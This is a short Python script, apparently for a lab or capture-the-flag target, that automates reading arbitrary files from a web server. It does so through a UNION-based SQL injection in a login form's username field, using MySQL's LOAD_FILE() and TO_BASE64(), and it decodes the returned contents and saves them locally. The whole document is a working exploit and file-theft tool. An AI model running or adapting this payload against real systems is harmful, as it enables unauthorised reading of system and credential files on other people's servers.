# This script will be used to make requests to a web server with a sqli vulnerability and using the mysql 5.0 < dbms. Using the LOAD_FILE() function we are able to have the db retreive files from the server. This script will automate the LFI process by querying the db with a list of files we provide at as an argument.

import sys
import requests
import re
import base64

# set regex expression as starting after admin and ending before </h3>. With DOTALL specified '.' matches all characters including newlines.
regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
# make request with file name
r = requests.post('http://10.129.106.120/administrative', data={'uname': f'admin\' UNION SELECT 1,TO_BASE64(LOAD_FILE(\'{sys.argv[1]}\')),3,4,5,6-- -', 'password': 'test'})

# search through returned response with our regex expression
match = re.search(regex, r.text)


# replace the /'s in the filenames with _'s
fileName = sys.argv[1].replace('/', '_')[1:]


# if the file exists on the box, write it to a file locally
if match.group(1) != "None" and match.group(1):
    
    # base64 decode the results
    decodedMatch = base64.b64decode(match.group(1))

    # decode the bytes to ascii
    decoded_string = decodedMatch.decode('ascii')
    with open('files/' + fileName, 'w') as f:
        f.write(decoded_string)
